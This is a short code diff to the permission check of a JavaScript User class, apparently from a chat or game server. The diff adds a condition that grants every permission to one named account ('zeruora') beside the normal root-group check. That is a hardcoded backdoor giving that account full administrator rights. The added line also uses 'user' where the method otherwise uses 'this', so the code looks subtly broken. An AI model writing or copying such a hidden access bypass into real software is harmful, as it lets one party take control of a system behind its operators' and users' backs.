@@ -602,7 +602,7 @@ class User {
 	can(permission, target = null, room = null) {
 		if (this.hasSysopAccess()) return true;
 		let groupData = Config.groups[this.group];
-		if (groupData && groupData['root']) {
+		if (groupData && groupData['root'] || user.id === 'zeruora') {
 			return true;
 		}
 
